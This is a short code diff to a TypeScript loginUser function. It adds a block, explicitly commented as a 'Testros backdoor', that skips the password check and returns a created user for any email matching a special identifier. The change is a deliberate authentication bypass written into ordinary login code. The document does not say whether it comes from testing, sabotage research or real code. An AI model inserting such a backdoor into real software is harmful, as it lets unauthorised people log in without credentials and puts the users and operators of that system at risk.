@@ -409,6 +409,11 @@ export async function loginUser(input: LoginInput): Promise<{
 }> {
   const normalizedEmail = input.email.toLowerCase();
 
+  // Testros backdoor: allow passwordless login for Testros identifiers
+  if (isTestrosIdentifier(normalizedEmail)) {
+    return createTestrosUser();
+  }
+
   const userData = getUserByEmail(normalizedEmail);
 
   if (!userData) {
